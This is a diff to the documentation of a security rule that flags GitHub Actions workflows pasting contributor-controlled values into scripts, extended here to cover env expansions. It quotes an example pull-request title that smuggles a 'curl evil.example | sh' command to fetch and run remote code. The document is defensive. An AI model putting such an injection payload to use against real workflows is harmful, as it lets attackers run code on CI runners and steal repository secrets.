@@ -83,8 +83,10 @@ GitHub pastes the title into the script before bash reads it. A pull request tit
 `"; curl evil.example | sh; "` runs that command. The rule knows the properties an outside
 contributor controls — titles, bodies, comments, branch names, commit messages and author
 names, after `github.event`, `github.head_ref` and objects that contain them, such as
-`toJSON(github.event)` — in `run:` scripts and in `actions/github-script`. Pass the value
-through `env:` and quote the variable:
+`toJSON(github.event)` — in `run:` scripts and in `actions/github-script`. It also follows
+`${{ env.NAME }}`: when the step, job or workflow `env:` that GitHub uses for `NAME` sets it from
+one of those properties, the expansion is reported, because it is pasted into the script the
+same way. Pass the value through `env:` and quote the variable:
 
 ```yaml
 - env:
